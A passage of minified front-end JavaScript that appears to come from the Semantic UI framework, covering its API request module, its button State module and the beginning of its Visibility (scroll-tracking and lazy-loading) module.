not support CSS animations" } } }(e, window, document),
        function(e, t, n, i) { "use strict"; var t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")();
            e.api = e.fn.api = function(n) { var i, r = e(e.isFunction(this) ? t : this),
                    o = r.selector || "",
                    a = (new Date).getTime(),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1); return r.each(function() { var r, d, f, h, p, b = e.isPlainObject(n) ? e.extend(!0, {}, e.fn.api.settings, n) : e.extend({}, e.fn.api.settings),
                        m = b.namespace,
                        g = b.metadata,
                        v = b.selector,
                        y = b.error,
                        w = b.className,
                        x = "." + m,
                        S = "module-" + m,
                        _ = e(this),
                        k = _.closest(v.form),
                        C = b.stateContext ? e(b.stateContext) : _,
                        A = this,
                        E = C[0],
                        T = _.data(S);
                    p = { initialize: function() { u || p.bind.events(), p.instantiate() }, instantiate: function() { p.verbose("Storing instance of module", p), T = p, _.data(S, T) }, destroy: function() { p.verbose("Destroying previous module for", A), _.removeData(S).off(x) }, bind: { events: function() { var e = p.get.event();
                                e ? (p.verbose("Attaching API events to element", e), _.on(e + x, p.event.trigger)) : "now" == b.on && (p.debug("Querying API endpoint immediately"), p.query()) } }, decode: { json: function(e) { if (void 0 !== e && "string" == typeof e) try { e = JSON.parse(e) } catch (e) {}
                                return e } }, read: { cachedResponse: function(e) { var n; return void 0 === t.Storage ? void p.error(y.noStorage) : (n = sessionStorage.getItem(e), p.debug("Using cached response", e, n), n = p.decode.json(n)) } }, write: { cachedResponse: function(n, i) { return i && "" === i ? void p.debug("Response empty, not caching", i) : void 0 === t.Storage ? void p.error(y.noStorage) : (e.isPlainObject(i) && (i = JSON.stringify(i)), sessionStorage.setItem(n, i), void p.verbose("Storing cached response for url", n, i)) } }, query: function() { if (p.is.disabled()) return void p.debug("Element is disabled API request aborted"); if (p.is.loading()) { if (!b.interruptRequests) return void p.debug("Cancelling request, previous request is still pending");
                                p.debug("Interrupting previous request"), p.abort() } if (b.defaultData && e.extend(!0, b.urlData, p.get.defaultData()), b.serializeForm && (b.data = p.add.formData(b.data)), !1 === (d = p.get.settings())) return p.cancelled = !0, void p.error(y.beforeSend); if (p.cancelled = !1, !(f = p.get.templatedURL()) && !p.is.mocked()) return void p.error(y.missingURL); if ((f = p.add.urlData(f)) || p.is.mocked()) { if (d.url = b.base + f, r = e.extend(!0, {}, b, { type: b.method || b.type, data: void 0, url: b.base + f, beforeSend: b.beforeXHR, success: function() {}, failure: function() {}, complete: function() {} }), p.debug("Querying URL", r.url), p.verbose("Using AJAX settings", r), "local" === b.cache && p.read.cachedResponse(f)) return p.debug("Response returned from local cache"), p.request = p.create.request(), void p.request.resolveWith(E, [p.read.cachedResponse(f)]);
                                b.throttle ? b.throttleFirstRequest || p.timer ? (p.debug("Throttling request", b.throttle), clearTimeout(p.timer), p.timer = setTimeout(function() { p.timer && delete p.timer, p.debug("Sending throttled request", void 0, r.method), p.send.request() }, b.throttle)) : (p.debug("Sending request", void 0, r.method), p.send.request(), p.timer = setTimeout(function() {}, b.throttle)) : (p.debug("Sending request", void 0, r.method), p.send.request()) } }, should: { removeError: function() { return !0 === b.hideError || "auto" === b.hideError && !p.is.form() } }, is: { disabled: function() { return _.filter(v.disabled).length > 0 }, expectingJSON: function() { return "json" === b.dataType || "jsonp" === b.dataType }, form: function() { return _.is("form") || C.is("form") }, mocked: function() { return b.mockResponse || b.mockResponseAsync || b.response || b.responseAsync }, input: function() { return _.is("input") }, loading: function() { return !!p.request && "pending" == p.request.state() }, abortedRequest: function(e) { return e && void 0 !== e.readyState && 0 === e.readyState ? (p.verbose("XHR request determined to be aborted"), !0) : (p.verbose("XHR request was not aborted"), !1) }, validResponse: function(t) { return p.is.expectingJSON() && e.isFunction(b.successTest) ? (p.debug("Checking JSON returned success", b.successTest, t), b.successTest(t) ? (p.debug("Response passed success test", t), !0) : (p.debug("Response failed success test", t), !1)) : (p.verbose("Response is not JSON, skipping validation", b.successTest, t), !0) } }, was: { cancelled: function() { return p.cancelled || !1 }, succesful: function() { return p.request && "resolved" == p.request.state() }, failure: function() { return p.request && "rejected" == p.request.state() }, complete: function() { return p.request && ("resolved" == p.request.state() || "rejected" == p.request.state()) } }, add: { urlData: function(t, n) { var i, r; return t && (i = t.match(b.regExp.required), r = t.match(b.regExp.optional), n = n || b.urlData, i && (p.debug("Looking for required URL variables", i), e.each(i, function(i, r) { var o = -1 !== r.indexOf("$") ? r.substr(2, r.length - 3) : r.substr(1, r.length - 2),
                                        a = e.isPlainObject(n) && void 0 !== n[o] ? n[o] : void 0 !== _.data(o) ? _.data(o) : void 0 !== C.data(o) ? C.data(o) : n[o]; if (void 0 === a) return p.error(y.requiredParameter, o, t), t = !1, !1;
                                    p.verbose("Found required variable", o, a), a = b.encodeParameters ? p.get.urlEncodedValue(a) : a, t = t.replace(r, a) })), r && (p.debug("Looking for optional URL variables", i), e.each(r, function(i, r) { var o = -1 !== r.indexOf("$") ? r.substr(3, r.length - 4) : r.substr(2, r.length - 3),
                                        a = e.isPlainObject(n) && void 0 !== n[o] ? n[o] : void 0 !== _.data(o) ? _.data(o) : void 0 !== C.data(o) ? C.data(o) : n[o];
                                    void 0 !== a ? (p.verbose("Optional variable Found", o, a), t = t.replace(r, a)) : (p.verbose("Optional variable not found", o), t = -1 !== t.indexOf("/" + r) ? t.replace("/" + r, "") : t.replace(r, "")) }))), t }, formData: function(t) { var n, i = void 0 !== e.fn.serializeObject,
                                    r = i ? k.serializeObject() : k.serialize(); return t = t || b.data, n = e.isPlainObject(t), n ? i ? (p.debug("Extending existing data with form data", t, r), t = e.extend(!0, {}, t, r)) : (p.error(y.missingSerialize), p.debug("Cant extend data. Replacing data with form data", t, r), t = r) : (p.debug("Adding form data", r), t = r), t } }, send: { request: function() { p.set.loading(), p.request = p.create.request(), p.is.mocked() ? p.mockedXHR = p.create.mockedXHR() : p.xhr = p.create.xhr(), b.onRequest.call(E, p.request, p.xhr) } }, event: { trigger: function(e) { p.query(), "submit" != e.type && "click" != e.type || e.preventDefault() }, xhr: { always: function() {}, done: function(t, n, i) { var r = this,
                                        o = (new Date).getTime() - h,
                                        a = b.loadingDuration - o,
                                        s = !!e.isFunction(b.onResponse) && (p.is.expectingJSON() ? b.onResponse.call(r, e.extend(!0, {}, t)) : b.onResponse.call(r, t));
                                    a = a > 0 ? a : 0, s && (p.debug("Modified API response in onResponse callback", b.onResponse, s, t), t = s), a > 0 && p.debug("Response completed early delaying state change by", a), setTimeout(function() { p.is.validResponse(t) ? p.request.resolveWith(r, [t, i]) : p.request.rejectWith(r, [i, "invalid"]) }, a) }, fail: function(e, t, n) { var i = this,
                                        r = (new Date).getTime() - h,
                                        o = b.loadingDuration - r;
                                    o = o > 0 ? o : 0, o > 0 && p.debug("Response completed early delaying state change by", o), setTimeout(function() { p.is.abortedRequest(e) ? p.request.rejectWith(i, [e, "aborted", n]) : p.request.rejectWith(i, [e, "error", t, n]) }, o) } }, request: { done: function(e, t) { p.debug("Successful API Response", e), "local" === b.cache && f && (p.write.cachedResponse(f, e), p.debug("Saving server response locally", p.cache)), b.onSuccess.call(E, e, _, t) }, complete: function(e, t) { var n, i;
                                    p.was.succesful() ? (i = e, n = t) : (n = e, i = p.get.responseFromXHR(n)), p.remove.loading(), b.onComplete.call(E, i, _, n) }, fail: function(e, t, n) { var i = p.get.responseFromXHR(e),
                                        o = p.get.errorFromRequest(i, t, n); if ("aborted" == t) return p.debug("XHR Aborted (Most likely caused by page navigation or CORS Policy)", t, n), b.onAbort.call(E, t, _, e), !0; "invalid" == t ? p.debug("JSON did not pass success test. A server-side error has most likely occurred", i) : "error" == t && void 0 !== e && (p.debug("XHR produced a server error", t, n), 200 != e.status && void 0 !== n && "" !== n && p.error(y.statusMessage + n, r.url), b.onError.call(E, o, _, e)), b.errorDuration && "aborted" !== t && (p.debug("Adding error state"), p.set.error(), p.should.removeError() && setTimeout(p.remove.error, b.errorDuration)), p.debug("API Request failed", o, e), b.onFailure.call(E, i, _, e) } } }, create: { request: function() { return e.Deferred().always(p.event.request.complete).done(p.event.request.done).fail(p.event.request.fail) }, mockedXHR: function() { var t, n, i, r = b.mockResponse || b.response,
                                    o = b.mockResponseAsync || b.responseAsync; return i = e.Deferred().always(p.event.xhr.complete).done(p.event.xhr.done).fail(p.event.xhr.fail), r ? (e.isFunction(r) ? (p.debug("Using specified synchronous callback", r), n = r.call(E, d)) : (p.debug("Using settings specified response", r), n = r), i.resolveWith(E, [n, !1, { responseText: n }])) : e.isFunction(o) && (t = function(e) { p.debug("Async callback returned response", e), e ? i.resolveWith(E, [e, !1, { responseText: e }]) : i.rejectWith(E, [{ responseText: e }, !1, !1]) }, p.debug("Using specified async response callback", o), o.call(E, d, t)), i }, xhr: function() { var t; return t = e.ajax(r).always(p.event.xhr.always).done(p.event.xhr.done).fail(p.event.xhr.fail), p.verbose("Created server request", t, r), t } }, set: { error: function() { p.verbose("Adding error state to element", C), C.addClass(w.error) }, loading: function() { p.verbose("Adding loading state to element", C), C.addClass(w.loading), h = (new Date).getTime() } }, remove: { error: function() { p.verbose("Removing error state from element", C), C.removeClass(w.error) }, loading: function() { p.verbose("Removing loading state from element", C), C.removeClass(w.loading) } }, get: { responseFromXHR: function(t) { return !!e.isPlainObject(t) && (p.is.expectingJSON() ? p.decode.json(t.responseText) : t.responseText) }, errorFromRequest: function(t, n, i) { return e.isPlainObject(t) && void 0 !== t.error ? t.error : void 0 !== b.error[n] ? b.error[n] : i }, request: function() { return p.request || !1 }, xhr: function() { return p.xhr || !1 }, settings: function() { var t; return t = b.beforeSend.call(E, b), t && (void 0 !== t.success && (p.debug("Legacy success callback detected", t), p.error(y.legacyParameters, t.success), t.onSuccess = t.success), void 0 !== t.failure && (p.debug("Legacy failure callback detected", t), p.error(y.legacyParameters, t.failure), t.onFailure = t.failure), void 0 !== t.complete && (p.debug("Legacy complete callback detected", t), p.error(y.legacyParameters, t.complete), t.onComplete = t.complete)), void 0 === t && p.error(y.noReturnedValue), !1 === t ? t : void 0 !== t ? e.extend(!0, {}, t) : e.extend(!0, {}, b) }, urlEncodedValue: function(e) { var n = t.decodeURIComponent(e),
                                    i = t.encodeURIComponent(e); return n !== e ? (p.debug("URL value is already encoded, avoiding double encoding", e), e) : (p.verbose("Encoding value using encodeURIComponent", e, i), i) }, defaultData: function() { var t = {}; return e.isWindow(A) || (p.is.input() ? t.value = _.val() : p.is.form() || (t.text = _.text())), t }, event: function() { return e.isWindow(A) || "now" == b.on ? (p.debug("API called without element, no events attached"), !1) : "auto" == b.on ? _.is("input") ? void 0 !== A.oninput ? "input" : void 0 !== A.onpropertychange ? "propertychange" : "keyup" : _.is("form") ? "submit" : "click" : b.on }, templatedURL: function(e) { if (e = e || _.data(g.action) || b.action || !1, f = _.data(g.url) || b.url || !1) return p.debug("Using specified url", f), f; if (e) { if (p.debug("Looking up url for action", e, b.api), void 0 === b.api[e] && !p.is.mocked()) return void p.error(y.missingAction, b.action, b.api);
                                    f = b.api[e] } else p.is.form() && (f = _.attr("action") || C.attr("action") || !1, p.debug("No url or action specified, defaulting to form action", f)); return f } }, abort: function() { var e = p.get.xhr();
                            e && "resolved" !== e.state() && (p.debug("Cancelling API request"), e.abort()) }, reset: function() { p.remove.error(), p.remove.loading() }, setting: function(t, n) { if (p.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, b, t);
                            else { if (void 0 === n) return b[t];
                                e.isPlainObject(b[t]) ? e.extend(!0, b[t], n) : b[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, p, t);
                            else { if (void 0 === n) return p[t];
                                p[t] = n } }, debug: function() {!b.silent && b.debug && (b.performance ? p.performance.log(arguments) : (p.debug = Function.prototype.bind.call(console.info, console, b.name + ":"), p.debug.apply(console, arguments))) }, verbose: function() {!b.silent && b.verbose && b.debug && (b.performance ? p.performance.log(arguments) : (p.verbose = Function.prototype.bind.call(console.info, console, b.name + ":"), p.verbose.apply(console, arguments))) }, error: function() { b.silent || (p.error = Function.prototype.bind.call(console.error, console, b.name + ":"), p.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                b.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", "Execution Time": n })), clearTimeout(p.performance.timer), p.performance.timer = setTimeout(p.performance.display, 500) }, display: function() { var t = b.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(p.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", o && (t += " '" + o + "'"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, r) { var o, a, s, c = T; return n = n || l, r = A || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (p.error(y.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), a } }, u ? (void 0 === T && p.initialize(), p.invoke(c)) : (void 0 !== T && T.invoke("destroy"), p.initialize()) }), void 0 !== i ? i : this }, e.api.settings = { name: "API", namespace: "api", debug: !1, verbose: !1, performance: !0, api: {}, cache: !0, interruptRequests: !0, on: "auto", stateContext: !1, loadingDuration: 0, hideError: "auto", errorDuration: 2e3, encodeParameters: !0, action: !1, url: !1, base: "", urlData: {}, defaultData: !0, serializeForm: !1, throttle: 0, throttleFirstRequest: !0, method: "get", data: {}, dataType: "json", mockResponse: !1, mockResponseAsync: !1, response: !1, responseAsync: !1, beforeSend: function(e) { return e }, beforeXHR: function(e) {}, onRequest: function(e, t) {}, onResponse: !1, onSuccess: function(e, t) {}, onComplete: function(e, t) {}, onFailure: function(e, t) {}, onError: function(e, t) {}, onAbort: function(e, t) {}, successTest: !1, error: { beforeSend: "The before send function has aborted the request", error: "There was an error with your request", exitConditions: "API Request Aborted. Exit conditions met", JSONParse: "JSON could not be parsed during error handling", legacyParameters: "You are using legacy API success callback names", method: "The method you called is not defined", missingAction: "API action used but no url was defined", missingSerialize: "jquery-serialize-object is required to add form data to an existing data object", missingURL: "No URL specified for api event", noReturnedValue: "The beforeSend callback must return a settings object, beforeSend ignored.", noStorage: "Caching responses locally requires session storage", parseError: "There was an error parsing your request", requiredParameter: "Missing a required URL parameter: ", statusMessage: "Server gave an error: ", timeout: "Your request timed out" }, regExp: { required: /\{\$*[A-z0-9]+\}/g, optional: /\{\/\$*[A-z0-9]+\}/g }, className: { loading: "loading", error: "error" }, selector: { disabled: ".disabled", form: "form" }, metadata: { action: "action", url: "url" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.state = function(t) { var i, r = e(this),
                    o = r.selector || "",
                    a = (n.documentElement, (new Date).getTime()),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1); return r.each(function() { var n, d = e.isPlainObject(t) ? e.extend(!0, {}, e.fn.state.settings, t) : e.extend({}, e.fn.state.settings),
                        f = d.error,
                        h = d.metadata,
                        p = d.className,
                        b = d.namespace,
                        m = d.states,
                        g = d.text,
                        v = "." + b,
                        y = b + "-module",
                        w = e(this),
                        x = this,
                        S = w.data(y);
                    n = { initialize: function() { n.verbose("Initializing module"), d.automatic && n.add.defaults(), d.context && "" !== o ? e(d.context).on(o, "mouseenter" + v, n.change.text).on(o, "mouseleave" + v, n.reset.text).on(o, "click" + v, n.toggle.state) : w.on("mouseenter" + v, n.change.text).on("mouseleave" + v, n.reset.text).on("click" + v, n.toggle.state), n.instantiate() }, instantiate: function() { n.verbose("Storing instance of module", n), S = n, w.data(y, n) }, destroy: function() { n.verbose("Destroying previous module", S), w.off(v).removeData(y) }, refresh: function() { n.verbose("Refreshing selector cache"), w = e(x) }, add: { defaults: function() { var i = t && e.isPlainObject(t.states) ? t.states : {};
                                e.each(d.defaults, function(t, r) { void 0 !== n.is[t] && n.is[t]() && (n.verbose("Adding default states", t, x), e.extend(d.states, r, i)) }) } }, is: { active: function() { return w.hasClass(p.active) }, loading: function() { return w.hasClass(p.loading) }, inactive: function() { return !w.hasClass(p.active) }, state: function(e) { return void 0 !== p[e] && w.hasClass(p[e]) }, enabled: function() { return !w.is(d.filter.active) }, disabled: function() { return w.is(d.filter.active) }, textEnabled: function() { return !w.is(d.filter.text) }, button: function() { return w.is(".button:not(a, .submit)") }, input: function() { return w.is("input") }, progress: function() { return w.is(".ui.progress") } }, allow: function(e) { n.debug("Now allowing state", e), m[e] = !0 }, disallow: function(e) { n.debug("No longer allowing", e), m[e] = !1 }, allows: function(e) { return m[e] || !1 }, enable: function() { w.removeClass(p.disabled) }, disable: function() { w.addClass(p.disabled) }, setState: function(e) { n.allows(e) && w.addClass(p[e]) }, removeState: function(e) { n.allows(e) && w.removeClass(p[e]) }, toggle: { state: function() { var t; if (n.allows("active") && n.is.enabled()) { if (n.refresh(), void 0 !== e.fn.api)
                                        if (t = w.api("get request"), w.api("was cancelled")) n.debug("API Request cancelled by beforesend"), d.activateTest = function() { return !1 }, d.deactivateTest = function() { return !1 };
                                        else if (t) return void n.listenTo(t);
                                    n.change.state() } } }, listenTo: function(t) { n.debug("API request detected, waiting for state signal", t), t && (g.loading && n.update.text(g.loading), e.when(t).then(function() { "resolved" == t.state() ? (n.debug("API request succeeded"), d.activateTest = function() { return !0 }, d.deactivateTest = function() { return !0 }) : (n.debug("API request failed"), d.activateTest = function() { return !1 }, d.deactivateTest = function() { return !1 }), n.change.state() })) }, change: { state: function() { n.debug("Determining state change direction"), n.is.inactive() ? n.activate() : n.deactivate(), d.sync && n.sync(), d.onChange.call(x) }, text: function() { n.is.textEnabled() && (n.is.disabled() ? (n.verbose("Changing text to disabled text", g.hover), n.update.text(g.disabled)) : n.is.active() ? g.hover ? (n.verbose("Changing text to hover text", g.hover), n.update.text(g.hover)) : g.deactivate && (n.verbose("Changing text to deactivating text", g.deactivate), n.update.text(g.deactivate)) : g.hover ? (n.verbose("Changing text to hover text", g.hover), n.update.text(g.hover)) : g.activate && (n.verbose("Changing text to activating text", g.activate), n.update.text(g.activate))) } }, activate: function() { d.activateTest.call(x) && (n.debug("Setting state to active"), w.addClass(p.active), n.update.text(g.active), d.onActivate.call(x)) }, deactivate: function() { d.deactivateTest.call(x) && (n.debug("Setting state to inactive"), w.removeClass(p.active), n.update.text(g.inactive), d.onDeactivate.call(x)) }, sync: function() { n.verbose("Syncing other buttons to current state"), n.is.active() ? r.not(w).state("activate") : r.not(w).state("deactivate") }, get: { text: function() { return d.selector.text ? w.find(d.selector.text).text() : w.html() }, textFor: function(e) { return g[e] || !1 } }, flash: { text: function(e, t, i) { var r = n.get.text();
                                n.debug("Flashing text message", e, t), e = e || d.text.flash, t = t || d.flashDuration, i = i || function() {}, n.update.text(e), setTimeout(function() { n.update.text(r), i.call(x) }, t) } }, reset: { text: function() { var e = g.active || w.data(h.storedText),
                                    t = g.inactive || w.data(h.storedText);
                                n.is.textEnabled() && (n.is.active() && e ? (n.verbose("Resetting active text", e), n.update.text(e)) : t && (n.verbose("Resetting inactive text", e), n.update.text(t))) } }, update: { text: function(e) { var t = n.get.text();
                                e && e !== t ? (n.debug("Updating text", e), d.selector.text ? w.data(h.storedText, e).find(d.selector.text).text(e) : w.data(h.storedText, e).html(e)) : n.debug("Text is already set, ignoring update", e) } }, setting: function(t, i) { if (n.debug("Changing setting", t, i), e.isPlainObject(t)) e.extend(!0, d, t);
                            else { if (void 0 === i) return d[t];
                                e.isPlainObject(d[t]) ? e.extend(!0, d[t], i) : d[t] = i } }, internal: function(t, i) { if (e.isPlainObject(t)) e.extend(!0, n, t);
                            else { if (void 0 === i) return n[t];
                                n[t] = i } }, debug: function() {!d.silent && d.debug && (d.performance ? n.performance.log(arguments) : (n.debug = Function.prototype.bind.call(console.info, console, d.name + ":"), n.debug.apply(console, arguments))) }, verbose: function() {!d.silent && d.verbose && d.debug && (d.performance ? n.performance.log(arguments) : (n.verbose = Function.prototype.bind.call(console.info, console, d.name + ":"), n.verbose.apply(console, arguments))) }, error: function() { d.silent || (n.error = Function.prototype.bind.call(console.error, console, d.name + ":"), n.error.apply(console, arguments)) }, performance: { log: function(e) { var t, i, r;
                                d.performance && (t = (new Date).getTime(), r = a || t, i = t - r, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: x, "Execution Time": i })), clearTimeout(n.performance.timer), n.performance.timer = setTimeout(n.performance.display, 500) }, display: function() { var t = d.name + ":",
                                    i = 0;
                                a = !1, clearTimeout(n.performance.timer), e.each(s, function(e, t) { i += t["Execution Time"] }), t += " " + i + "ms", o && (t += " '" + o + "'"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, r, o) { var a, s, c, u = S; return r = r || l, o = x || o, "string" == typeof t && void 0 !== u && (t = t.split(/[\. ]/), a = t.length - 1, e.each(t, function(i, r) { var o = i != a ? r + t[i + 1].charAt(0).toUpperCase() + t[i + 1].slice(1) : t; if (e.isPlainObject(u[o]) && i != a) u = u[o];
                                else { if (void 0 !== u[o]) return s = u[o], !1; if (!e.isPlainObject(u[r]) || i == a) return void 0 !== u[r] ? (s = u[r], !1) : (n.error(f.method, t), !1);
                                    u = u[r] } })), e.isFunction(s) ? c = s.apply(o, r) : void 0 !== s && (c = s), e.isArray(i) ? i.push(c) : void 0 !== i ? i = [i, c] : void 0 !== c && (i = c), s } }, u ? (void 0 === S && n.initialize(), n.invoke(c)) : (void 0 !== S && S.invoke("destroy"), n.initialize()) }), void 0 !== i ? i : this }, e.fn.state.settings = { name: "State", debug: !1, verbose: !1, namespace: "state", performance: !0, onActivate: function() {}, onDeactivate: function() {}, onChange: function() {}, activateTest: function() { return !0 }, deactivateTest: function() { return !0 }, automatic: !0, sync: !1, flashDuration: 1e3, filter: { text: ".loading, .disabled", active: ".disabled" }, context: !1, error: { beforeSend: "The before send function has cancelled state change", method: "The method you called is not defined." }, metadata: { promise: "promise", storedText: "stored-text" }, className: { active: "active", disabled: "disabled", error: "error", loading: "loading", success: "success", warning: "warning" }, selector: { text: !1 }, defaults: { input: { disabled: !0, loading: !0, active: !0 }, button: { disabled: !0, loading: !0, active: !0 }, progress: { active: !0, success: !0, warning: !0, error: !0 } }, states: { active: !0, disabled: !0, error: !0, loading: !0, success: !0, warning: !0 }, text: { disabled: !1, flash: !1, hover: !1, active: !1, inactive: !1, activate: !1, deactivate: !1 } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.visibility = function(i) { var r, o = e(this),
                    a = o.selector || "",
                    s = (new Date).getTime(),
                    c = [],
                    u = arguments[0],
                    l = "string" == typeof u,
                    d = [].slice.call(arguments, 1),
                    f = o.length,
                    h = 0; return o.each(function() { var o, p, b, m, g = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.visibility.settings, i) : e.extend({}, e.fn.visibility.settings),
                        v = g.className,
                        y = g.namespace,
                        w = g.error,
                        x = g.metadata,
                        S = "." + y,
                        _ = "module-" + y,
                        k = e(t),
                        C = e(this),
                        A = e(g.context),
                        E = (C.selector, C.data(_)),
                        T = t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame || function(e) { setTimeout(e, 0) },
                        M = this,
                        R = !1;
                    m = { initialize: function() { m.debug("Initializing", g), m.setup.cache(), m.should.trackChanges() && ("image" == g.type && m.setup.image(), "fixed" == g.type && m.setup.fixed(), g.observeChanges && m.observeChanges(), m.bind.events()), m.save.position(), m.is.visible() || m.error(w.visible, C), g.initialCheck && m.checkVisibility(), m.instantiate() }, instantiate: function() { m.debug("Storing instance", m), C.data(_, m), E = m }, destroy: function() { m.verbose("Destroying previous module"), b && b.disconnect(), p && p.disconnect(), k.off("load" + S, m.event.load).off("resize" + S, m.event.resize), A.off("scroll" + S, m.event.scroll).off("scrollchange" + S, m.event.scrollchange), "fixed" == g.type && (m.resetFixed(), m.remove.placeholder()), C.off(S).removeData(_) }, observeChanges: function() { "MutationObserver" in t && (p = new MutationObserver(m.event.contextChanged), b = new MutationObserver(m.event.changed), p.observe(n, { childList: !0, subtree: !0 }), b.observe(M, { childList: !0, subtree: !0 }), m.debug("Setting up mutation observer", b)) }, bind: { events: function() { m.verbose("Binding visibility events to scroll and resize"), g.refreshOnLoad && k.on("load" + S, m.event.load), k.on("resize" + S, m.event.resize), A.off("scroll" + S).on("scroll" + S, m.event.scroll).on("scrollchange" + S, m.event.scrollchange) } }, event: { changed: function(e) { m.verbose("DOM tree modified, updating visibility calculations"), m.timer = setTimeout(function() { m.verbose("DOM tree modified, updating sticky menu"), m.refresh() }, 100) }, contextChanged: function(t) {
                                [].forEach.call(t, function(t) { t.removedNodes && [].forEach.call(t.removedNodes, function(t) {
                                        (t == M || e(t).find(M).length > 0) && (m.debug("Element removed from DOM, tearing down events"), m.destroy()) }) }) }, resize: function() { m.debug("Window resized"), g.refreshOnResize && T(m.refresh) }, load: function() { m.debug("Page finished loading"), T(m.refresh) }, scroll: function() { g.throttle ? (clearTimeout(m.timer), m.timer = setTimeout(function() { A.triggerHandler("scrollchange" + S, [A.scrollTop()]) }, g.throttle)) : T(function() { A.triggerHandler("scrollchange" + S, [A.scrollTop()]) }) }, scrollchange: function(e, t) { m.checkVisibility(t) } }, precache: function(t, i) { t instanceof Array || (t = [t]); for (var r = t.length, o = 0, a = [], s = n.createElement("img"), c = function() {++o >= t.length && e.isFunction(i) && i() }; r--;) s = n.createElement("img"), s.onload = c, s.onerror = c, s.src = t[r], a.push(s) }, enableCallbacks: function() { m.debug("Allowing callbacks to occur"), R = !1 }, disableCallbacks: function() { m.debug("Disabling all callbacks temporarily"), R = !0 }, should: { trackChanges: function() { return l ? (m.debug("One time query, no need to bind events"), !1) : (m.debug("Callbacks being attached"), !0) } }, setup: { cache: function() { m.cache = { occurred: {}, screen: {}, element: {} } }, image: function() { var e = C.data(x.src);
                                e && (m.verbose("Lazy loading image", e), g.once = !0, g.observeChanges = !1, g.onOnScreen = function() { m.debug("Image on screen", M), m.precache(e, function() { m.set.image(e, function() { h++, h == f && g.onAllLoaded.call(this), g.onLoad.call(this) }) }) }) }, fixed: function() { m.debug("Setting up fixed"), g.once = !1, g.observeChanges = !1, g.initialCheck = !0, g.refreshOnLoad = !0, i.transition || (g.transition = !1), m.create.placeholder(), m.debug("Added placeholder", o), g.onTopPassed = function() { m.debug("Element passed, adding fixed position", C), m.show.placeholder(), m.set.fixed(), g.transition && void 0 !== e.fn.transition && C.transition(g.transition, g.duration) }, g.onTopPassedReverse = function() { m.debug("Element returned to position, removing fixed", C), m.hide.placeholder(), m.remove.fixed() } } }, create: { placeholder: function() { m.verbose("Creating fixed position placeholder"), o = C.clone(!1).css("display", "none").addClass(v.placeholder).insertAfter(C) } }, show: { placeholder: function() { m.verbose("Showing placeholder"), o.css("display", "block").css("visibility", "hidden") } }, hide: { placeholder: function() { m.verbose("Hiding placeholder"), o.css("display", "none").css("visibility", "") } }, set: { fixed: function() { m.verbose("Setting element to fixed position"), C.addClass(v.fixed).css({ position: "fixed", top: g.offset + "px", left: "auto", zIndex: g.zIndex }), g.onFixed.call(M) }, image: function(t, n) { if (C.attr("src", t), g.transition)
                                    if (void 0 !== e.fn.transition) { if (C.hasClass(v.visible)) return void m.debug("Transition already occurred on this image, skipping animation");
                                        C.transition(g.transition, g.duration, n) } else C.fadeIn(g.duration, n);
                                else C.show() } }, is: { onScreen: function() { return m.get.elementCalculations().onScreen }, offScreen: function() { return m.get.elementCalculations().offScreen }, visible: function() { return !(!m.cache || !m.cache.element) && !(0 === m.cache.element.width && 0 === m.cache.element.offset.top) }, verticallyScrollableContext: function() { var e = A.get(0) !== t && A.css("overflow-y"); return "auto" == e || "scroll" == e }, horizontallyScrollableContext: function() { var e = A.get(0) !== t && A.css("overflow-x"); return "auto" == e || "scroll" == e } }, refresh: function() { m.debug("Refreshing constants (width/height)"), "fixed" == g.type && m.resetFixed(), m.reset(), m.save.position(), g.checkOnRefresh && m.checkVisibility(), g.onRefresh.call(M) }, resetFixed: function() { m.remove.fixed(), m.remove.occurred() }, reset: function() { m.verbose("Resetting all cached values"), e.isPlainObject(m.cache) && (m.cache.screen = {}, m.cache.element = {}) }, checkVisibility: function(e) { m.verbose("Checking visibility of element", m.cache.element), !R && m.is.visible() && (m.save.scroll(e), m.save.calculations(), m.passed(), m.passingReverse(), m.topVisibleReverse(), m.bottomVisibleReverse(), m.topPassedReverse(), m.bottomPassedReverse(), m.onScreen(), m.offScreen(), m.passing(), m.topVisible(), m.bottomVisible(), m.topPassed(), m.bottomPassed(), g.onUpdate && g.onUpdate.call(M, m.get.elementCalculations())) }, passed: function(t, n) { var i = m.get.elementCalculations(); if (t && n) g.onPassed[t] = n;
